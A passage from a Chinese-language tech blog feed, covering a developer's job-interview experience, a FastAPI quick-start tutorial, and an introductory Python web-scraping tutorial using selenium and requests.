上海的人資，主要會溝通三件事情:</li></ol><ul><li>介紹工作職缺、薪資範圍，範圍中位數大概會比現在在職的台商多 50%</li><li>透過英文問簡單的前端相關知識選擇題，英文題目英文選項，可以用中文提問和回答</li><li>若是考試結果還可以，會需要補上最新版本的履歷會協助轉給台灣地區的 HR</li></ul><p>第一次的問答其實完全考聽力，有很多選項答案聽起來超像，但題目本身不難，大多就是問問什麼是 this 或是閉包是什麼等等基礎知識。</p><ol start="2"><li>台灣地區的 HR 主要會針對相關經驗再次了解，並且給予相關建議。</li></ol><ul><li>面試流程與面試官說明: 會給予準備方向，並建議該如何準備</li><li>履歷上的建議: HR 人很好有特別提醒履歷上要放上大學、研究所</li><li>面試過程中需注意的事項: 可能被發現講話不太演戲，HR 特別建議要包裝一下講話方式</li></ul><h2 id="技術面試"><a href="#技術面試" class="headerlink" title="技術面試"></a>技術面試</h2><p>首先第一發就是自我介紹，我大多都是照著部落格的簡介念:</p><blockquote><p>嗨, 我是彥成，前端工程師，網站前後端開發經驗六年，一開始是後端工程師，目前專注在 React.js、 Next.js 相關技術及應用上，後端能使用 Node.js、Socket.IO 做 API 開發和即時資料交換。</p></blockquote><p>面試過程為會直接開兩題線上的 Leet Code 進行，考試本身不難就都考一些基本觀念，平常工作如果可以不用 Google 就完成任務，線上考試算很輕鬆。</p><p>作答過程會跟兩位工程師進行互動，應該是因應疫情沒有白板題所以改成這樣的方式。</p><ul><li>溝通 React 的基礎觀念</li><li>時間空間複雜度轉換</li></ul><p>半小時一題，快速寫完之後最後只會剩下一些時間快速跟對方兩位工程師交流就結束了，不過後來同事的老婆也有去面試聽說改成只考一題。</p><h2 id="行為面試"><a href="#行為面試" class="headerlink" title="行為面試"></a>行為面試</h2><p>行為面試主要是 People Manager 負責，用人主管主要就是踏實地進行 STAR 的多輪問答，過程中你會看到主管在認真做筆記。</p><ul><li>S 情境（Situation）</li><li>T 任務（Task）</li><li>A 行動（Action）</li><li>R 結果（Result）</li></ul><p>問的問題大多偏個性，所以問的很多面向都是偏個人，印象中還要用動物還是什麼之類的形容自己?</p><p>感覺上這次主要是會針對個人的個性是不是有吻合公司的價值觀還有企業的形象。其他印象中的問題:</p><ul><li>遇到挫折怎麼處理</li><li>目前為止遇到最難的問題是什麼是怎麼解決</li><li>三個關鍵字或形容詞? 這邊建議先查好企業相關形象</li></ul><h2 id="團隊合作"><a href="#團隊合作" class="headerlink" title="團隊合作"></a>團隊合作</h2><p>團隊合作類的面試比較像是在聊天，這個關卡會請 PO 以及 QA 主管來跟你聊天，主要是想了解你在專案進行上或合作的喜好?</p><p>有點印象的幾個問題:</p><ul><li>寫 E2E 測試成本不低，你怎麼看?</li><li>剛剛聽你說 OOXX 這樣很煩，那如果改成是 XOOO 或是 OXXX 哪個你覺得比較煩?</li></ul><blockquote><p>記得不要不小心抱怨其他部門同事，就算要講也要想一個說法</p></blockquote><p>這半年多來為了讓專案前進，執行端 RD 在規畫給不完全也補不完全的情況下只能跟其他部門 RD 合作用反向工程的方式來破解和移植現有專案到另外一個平台，並且在移植的過程中順便整理規格文件，個人是真的覺得這個部分有點荒謬。</p><p>事後跟現在的同事討論，同事建議說其實他們在意的是結果，有時候不用抱怨太多過程，要提到你遇到問題後做了什麼最後得到什麼成果。</p><p>最後 PO 有提到工作形式會跟你以往不同，這個職缺會很多除了開發以外的事情。個人感受上 PO 應答上大多繞邊走模糊地帶或把問題換個方式丟回來，比較不愛正面回答問題。</p><h2 id="系統設計"><a href="#系統設計" class="headerlink" title="系統設計"></a>系統設計</h2><p>系統架構設計，不太確定是不是想要套話，因為目前在做看盤軟體的公司上班，他們剛好考試就考你要怎麼實作一個提供報價的後端。過程中會聊你遇到一些情境會怎麼做，大概是想看說過去我做過專案的規模還有對一些系統的概念而已。</p><p>個人是不太想演戲，但又不敢講得太詳細，可是過程中還是一定會被現有的架構跟解決方案影響到回答。兩位工程師會在過程中引導你回答一些答案，但其實不太確定這個關卡主要是要我們回答和提到和展現什麼?</p><h2 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h2><p>整體的面試流程覺得算舒服，但是時間安排上我覺得有幾場算是有點侷限，面試者大多都是被動的情況，並沒有太多機會讓我們問問題。</p><ul><li>技術面試:<ul><li>面試過程中技術面試第一次有點太簡單</li><li>系統設計，其實不太知道對方想要知道什麼，所以也不太會互動跟回答</li></ul></li><li>個人特質:<ul><li>個人特質，覺得主管都蠻會從聊天之中套話</li><li>團隊合作，只要稍微聊到工作上不爽的問題就會一直追問，所以感覺就算事先準備好要演戲也是很困難</li></ul></li></ul><p>最後如果不是候選人的話，可能是 HR 比較忙，所以默默被無聲卡。</p>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python FastAPI 快速入門</title>
      <link href="/2021/10/08/python-fast-api/"/>
      <url>/2021/10/08/python-fast-api/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-FastAPI"><a href="#什麼是-FastAPI" class="headerlink" title="什麼是 FastAPI?"></a>什麼是 FastAPI?</h2><p>FastAPI 提供了方便快速開發的環境，透過自動產生文件與支援型別確認減少錯誤，官方文件表示能夠減少大約 40% 的人為錯誤。</p><ul><li>Type Hint 支援，增加程式可讀性，檢查變數型態更方便</li><li>符合 OpenAPI，能產生配置檔提供相關工具使用</li><li>透過服務自動生成線上文件<ul><li>API Spec 文件管理困難: 以往開發者還需要去撰寫像是 swagger.json 去產生線上文件</li></ul></li><li>解決 Python GIL 限制，可以跑 ASGI<ul><li>WSGI: 同步溝通</li><li>ASGI: 非同步溝通</li></ul></li></ul><h2 id="怎麼使用-FastAPI"><a href="#怎麼使用-FastAPI" class="headerlink" title="怎麼使用 FastAPI?"></a>怎麼使用 FastAPI?</h2><p>沒有最好的工具，只有適合的工具，小編在這邊體驗過後，推薦給大家 :)</p><p>簡單撰寫並啟動後，除了程式定義的路徑外還會自動生成文件及設定檔:</p><ul><li>自動產生可互動的線上文件<ul><li><code>/docs</code> 產生 swagger 文件頁面，可以執行 live demo</li><li><code>/redoc</code> 產生 ReDoc 文件頁面，可以執行 live demo</li></ul></li><li><code>/openapi.json</code> 可以拿去其他任何支援 openapi 的工具和平台利用<ul><li>譬如生成一個 <a href="https://github.com/jormaechea/open-api-mocker">Mock Server</a> 幫助開發</li></ul></li></ul><ol><li>安裝</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install fastapi uvicorn</span><br></pre></td></tr></table></figure><ol start="2"><li>建立一個範例檔 <code>demo.py</code></li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&#x27;/book/&#123;book_id&#125;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_book_by_id</span>(<span class="params">book_id: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;book_id&#x27;</span>: book_id</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>執行</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uvicorn demo:app --reload</span><br></pre></td></tr></table></figure><p>到可以線上互動的文件去觀察目前的情況:</p><blockquote><p>Swagger: <code>/docs</code> (圖片來源: <a href="https://fastapi.tiangolo.com/">https://fastapi.tiangolo.com/</a>)<br><img src="https://fastapi.tiangolo.com/img/index/index-01-swagger-ui-simple.png"></p></blockquote><blockquote><p>ReDoc: <code>/redoc</code> (圖片來源: <a href="https://fastapi.tiangolo.com/">https://fastapi.tiangolo.com/</a>)<br><img src="https://fastapi.tiangolo.com/img/index/index-02-redoc-simple.png"></p></blockquote><h3 id="Path-Param"><a href="#Path-Param" class="headerlink" title="Path Param"></a>Path Param</h3><p>可以定義同樣的路徑，一個用變數一個用定值，路由的比對是照順序，所以要確認 <code>/users/me</code> 放在前面</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/users/me&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">read_user_me</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;user_id&quot;</span>: <span class="string">&quot;the current user&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/users/&#123;user_id&#125;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">read_user</span>(<span class="params">user_id: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;user_id&quot;</span>: user_id&#125;</span><br></pre></td></tr></table></figure><h3 id="Query-Param"><a href="#Query-Param" class="headerlink" title="Query Param"></a>Query Param</h3><p><code>/get_book?book_id=132</code></p><ul><li>用 query param 的方式帶參數</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&#x27;/get_book&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_book_by_id_via_query</span>(<span class="params">book_id: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;book_id&#x27;</span>: book_id</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>/book/1/with_mode?query_mode=author</code></p><ul><li>嘗試混和 url path 跟 query param</li><li>定義 <code>query_mode</code> 的選項只有 <code>author</code>、<code>customer</code> 兩種</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">QueryModeEnum</span>(<span class="title class_ inherited__">Enum</span>):</span><br><span class="line">    AUTHOR = <span class="string">&#x27;author&#x27;</span></span><br><span class="line">    CUSTOMER = <span class="string">&#x27;customer&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&#x27;/book/&#123;book_id&#125;/with_mode&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_book_by_id_mix</span>(<span class="params">book_id: <span class="built_in">int</span>, query_mode: QueryModeEnum</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;book_id&#x27;</span>: book_id,</span><br><span class="line">        <span class="string">&#x27;query_mode&#x27;</span>: query_mode,</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="Input-Validation"><a href="#Input-Validation" class="headerlink" title="Input Validation"></a>Input Validation</h3><p><code>/book/&#123;book_id&#125;/with_validation</code></p><ul><li>幫網址列的輸入參數加上防呆，這裡的例子為要大於 1</li><li>定義 Book 物件格式<ul><li>可以放在 Input 的參數中防呆</li></ul></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> pydantic <span class="keyword">import</span> BaseModel, Field</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Book</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    bid: <span class="built_in">int</span> = Field(..., ge=<span class="number">1</span>, title=<span class="string">&#x27;book id&#x27;</span>, description=<span class="string">&#x27;`markdown`&#x27;</span>, example=<span class="number">5</span>)</span><br><span class="line">    name: <span class="built_in">str</span> = Field(..., min_length=<span class="number">2</span>)</span><br><span class="line">    price: <span class="built_in">float</span> = Field(..., gt=<span class="number">0</span>)</span><br><span class="line">    category: BookCategory</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&#x27;/book/&#123;book_id&#125;/with_validation&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_book_by_id_with_validation</span>(<span class="params">book_id: <span class="built_in">int</span> = Path(<span class="params">..., ge=<span class="number">1</span></span>)</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;book_id&#x27;</span>: book_id</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&#x27;/book&#x27;</span>, response_model=Book</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_book_by_id_with_validation_and_some_extra_documnet</span>(<span class="params"></span></span><br><span class="line"><span class="params">    payload: Book</span></span><br><span class="line"><span class="params"></span>):</span><br><span class="line">    payload.name += <span class="string">&#x27; suffix&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><h3 id="Response-Validation"><a href="#Response-Validation" class="headerlink" title="Response Validation"></a>Response Validation</h3><ul><li>定義 BookCategory 的列舉，可以限定 category 只能二擇一</li><li>定義 Book 物件格式<ul><li>決定回傳的格式參數，若是亂傳就會失敗</li></ul></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pydantic <span class="keyword">import</span> BaseModel, Field</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BookCategory</span>(<span class="built_in">str</span>, Enum):</span><br><span class="line">    comics = <span class="string">&#x27;comics&#x27;</span></span><br><span class="line">    cooking = <span class="string">&#x27;cooking&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Book</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    bid: <span class="built_in">int</span> = Field(..., ge=<span class="number">1</span>, title=<span class="string">&#x27;book id&#x27;</span>, description=<span class="string">&#x27;`markdown`&#x27;</span>, example=<span class="number">5</span>)</span><br><span class="line">    name: <span class="built_in">str</span> = Field(..., min_length=<span class="number">2</span>)</span><br><span class="line">    price: <span class="built_in">float</span> = Field(..., gt=<span class="number">0</span>)</span><br><span class="line">    category: BookCategory</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&#x27;/book/&#123;book_id&#125;/with_response_model&#x27;</span>, response_model=Book</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_book_by_id_with_validation_and_some_extra_documnet</span>(<span class="params"></span></span><br><span class="line"><span class="params">    book_id: <span class="built_in">int</span> = Path(<span class="params">..., ge=<span class="number">1</span>, example=<span class="number">5</span></span>)</span></span><br><span class="line"><span class="params"></span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;book_id&#x27;</span>: book_id&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># return &#123;</span></span><br><span class="line">    <span class="comment">#     &quot;bid&quot;: 5,</span></span><br><span class="line">    <span class="comment">#     &quot;name&quot;: &quot;string suffix&quot;,</span></span><br><span class="line">    <span class="comment">#     &quot;price&quot;: 10,</span></span><br><span class="line">    <span class="comment">#     &quot;category&quot;: &quot;comics&quot;</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 網站技術 </tag>
            
            <tag> Backend </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python Crawler 爬蟲入門範例</title>
      <link href="/2021/10/05/python-crawler/"/>
      <url>/2021/10/05/python-crawler/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是網站爬蟲"><a href="#什麼是網站爬蟲" class="headerlink" title="什麼是網站爬蟲"></a>什麼是網站爬蟲</h2><p>網站爬蟲可以將爬取的頁面儲存，透過網站爬蟲，開發者可以蒐集網路更多的資源供後續使用。</p><p>舉一個大家都聽過的應用，Google 搜尋引擎背後其實也是透過爬蟲的技術來將網站資料存下來進行索引來提供用戶搜尋。</p><p>由於爬蟲存取網站的過程還是會消耗站台系統資源，所以身為爬蟲開發者要遵守的價值觀有兩點如下:</p><ul><li><strong>不要打爆對方</strong></li><li>遵守 robots.txt 中定義規則，這些規則會標註禁止或開放存取哪些路徑</li></ul><h2 id="Python-網站爬蟲工具"><a href="#Python-網站爬蟲工具" class="headerlink" title="Python 網站爬蟲工具"></a>Python 網站爬蟲工具</h2><p>Python 的爬蟲工具常見有以下兩種:</p><ul><li>selenium: 萬用門檻低</li><li>requests: 效率好、較不易受 JavaScript 影響，因為不會抓照片、UI 變化等等，只會抓整個 html 的文本</li></ul><p>常見的網站爬蟲情境如下:</p><ul><li>一步可爬: 資料就放在頁面中的表格</li><li>查詢後爬: 需要透過搜尋篩選框</li><li>先登入後查詢才能爬<ul><li>先用 selenium 登入再用 requests 打包資料</li><li>驗證碼破解<ul><li>Tesseract</li><li>Tesseract + keras</li></ul></li></ul></li></ul><h2 id="網站反爬蟲"><a href="#網站反爬蟲" class="headerlink" title="網站反爬蟲"></a>網站反爬蟲</h2><p>網站要反爬蟲就要製造障礙，去想說爬蟲怎麼爬會難爬取資料，一般的反爬蟲如下:</p><ul><li>登入後才能查詢，擋 header 或是 cookie</li><li>CSRFPreventionSalt 改成一次性</li><li>驗證碼 (選圖片、加減乘除)</li><li>隨機跳 pop window 或是 alert</li><li>Table 變成照片或 PDF 會更難爬</li><li>xPath 爬蟲，xPath 中新增 DIV，不影響使用者體驗下還能反爬蟲</li></ul><p>流量要先壓力測試，不然被爬幾下就壞了也很糟糕:</p><ul><li>從 GA、Log 去看流量，然後直接擋掉</li><li>locust 套件</li></ul><h2 id="Python-Selenium-爬蟲實作"><a href="#Python-Selenium-爬蟲實作" class="headerlink" title="Python Selenium 爬蟲實作"></a>Python Selenium 爬蟲實作</h2><p>由於小編的電腦是從大學用到現在已經有點年老，所以這次直接使用 Google 的 Colab 免費使用 GPU 的運算資源，Colab 的使用方法跟 Jupyter notebook 一樣，可以直接執行 Python 的程式碼。</p><p>來示範一步可爬的網站，以玉山銀行的網站為例:</p><ol start="0"><li>Colab 需要先安裝才能夠使用 selenium</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">!pip install selenium</span><br><span class="line">!apt-get update <span class="comment"># to update ubuntu to correctly run apt install</span></span><br><span class="line">!apt install chromium-chromedriver</span><br><span class="line">!cp /usr/lib/chromium-browser/chromedriver /usr/<span class="built_in">bin</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.insert(<span class="number">0</span>,<span class="string">&#x27;/usr/lib/chromium-browser/chromedriver&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>引入資料處理常見的 pandas、還有本次爬蟲主角 selenium</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br></pre></td></tr></table></figure><ol start="2"><li>透過 webdriver 指定瀏覽器為 chrome，並且設定相關參數，最後透過瀏覽器開啟網站</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chrome_options = webdriver.ChromeOptions()</span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;--no-sandbox&#x27;</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;--disable-dev-shm-usage&#x27;</span>)</span><br><span class="line">browser = webdriver.Chrome(<span class="string">&#x27;chromedriver&#x27;</span>,chrome_options=chrome_options)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://www.esunbank.com.tw/bank/about/announcement/announcement?i=eqQb451_o06vZeJpBZLLLQ&amp;amp;p=QEdQ8PAaO0GrIzIcAevp0A&amp;amp;d=hxK-VOJqWkGADb4tgPQH4Q&#x27;</span></span><br><span class="line">browser.get(url)</span><br></pre></td></tr></table></figure><ol start="3"><li>透過 Pandas 套件提供的 <code>read_html()</code> 輕鬆讀取網頁中的 <code>&lt;table&gt;</code> 表格，這裡就直接選取第一個</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pd.read_html(browser.page_source)[<span class="number">0</span>].head()</span><br></pre></td></tr></table></figure><ol start="4"><li>或著我們也可以透過 xpath 來進行指定 html 的範圍，然後也是一樣餵給 <code>read_html()</code></li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">element_xpath = <span class="string">&#x27;//*[@id=&quot;mainform&quot;]/div[10]/div[2]/div[2]/table[1]&#x27;</span></span><br><span class="line">target_table = browser.find_element_by_xpath(element_xpath)</span><br><span class="line">html_string = target_table.get_attribute(<span class="string">&#x27;outerHTML&#x27;</span>)</span><br><span class="line">pd.read_html(html_string)[<span class="number">0</span>].head()</span><br></pre></td></tr></table></figure><ol start="5"><li>如果遇到彈跳視窗來阻擋，一樣可以透過 xpath 先找到，然後透過 JavaScript 把 Element 從 Dom 中移除。</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 移除彈跳視窗</span></span><br><span class="line">element = browser.find_element_by_xpath(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">browser.execute_script(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">var element = arguments[0];</span></span><br><span class="line"><span class="string">element.parentNode.removeChild(element);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, element);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Python-Requests-爬蟲實作"><a href="#Python-Requests-爬蟲實作" class="headerlink" title="Python Requests 爬蟲實作"></a>Python Requests 爬蟲實作</h2><p>requests 不同於 selenium，抓取下來的會是純文本，不包含相關圖片等靜態資源，所以對伺服器的負擔相對較小，接下來要示範先查詢後爬的網站，這邊會以 104 人力銀行網站為例，需要透過搜尋篩選框來篩選職缺訊息。</p><p>這個 API 明顯有幾個參數，所以接下來就會需要去整理相關資訊</p><ul><li>indcat: 產業別</li><li>area: 地區</li><li>page: 頁數</li></ul><ol><li>引入資料處理常見的 pandas、還有本次爬蟲主角 requests</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br></pre></td></tr></table></figure><ol start="2"><li>網站有基本反爬蟲所以需要設定 Headers 來騙過伺服器，最後透過 requests 開始抓取資料</li></ol><ul><li>User-Agent (用戶端)資訊: ‘Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36’</li><li>Referer (從哪裏來): ‘<a href="https://www.104.com.tw/">https://www.104.com.tw/</a>‘</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.104.com.tw/&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">url= <span class="string">&#x27;https://www.104.com.tw/jobs/search/list?ro=1&amp;indcat=1003000000&amp;area=6001001000&amp;order=11&amp;asc=0&amp;page=&amp;mode=l&#x27;</span></span><br><span class="line">resp = requests.get(url, headers=headers)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>透過 Pandas 套件提供的 <code>DataFrame</code> 將資料存下來，先顯示個三筆看看</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pd.DataFrame(resp.json()[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;list&#x27;</span>]).head(<span class="number">3</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="4"><li>當然一次爬個 10 頁也是沒問題</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">df = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    url= <span class="string">f&#x27;https://www.104.com.tw/jobs/search/list?ro=1&amp;indcat=1003000000&amp;area=6001001000&amp;order=11&amp;asc=0&amp;page=<span class="subst">&#123;page&#125;</span>&amp;mode=l&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    resp = requests.get(url, headers=headers)</span><br><span class="line">    ndf = pd.DataFrame(resp.json()[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;list&#x27;</span>])</span><br><span class="line">    df.append(ndf)</span><br><span class="line">    <span class="keyword">if</span> ndf.shape[<span class="number">0</span>] &lt; <span class="number">30</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">df = pd.concat(df, ignore_index=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><ol start="5"><li>接著是整理地區跟產業別的篩選條件，舉地區資料如下，會透過 explode 把 array 中的 n 做展開，然後透過 apply 去整理資料，最後透過 loc 把剛剛展開的 n 拿掉生成新的 Dataframe</li></ol><ul><li>explode 的說明可以參考<a href="https://www.w3resource.com/pandas/dataframe/dataframe-explode.php">連結</a></li><li>apply 的說明可以參考<a href="https://www.w3resource.com/pandas/dataframe/dataframe-apply.php">連結</a></li><li>loc 的說明可以參考<a href="https://www.w3resource.com/pandas/dataframe/dataframe-loc.php">連結</a></li></ul><p>第 0 筆的 n 資料如下:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 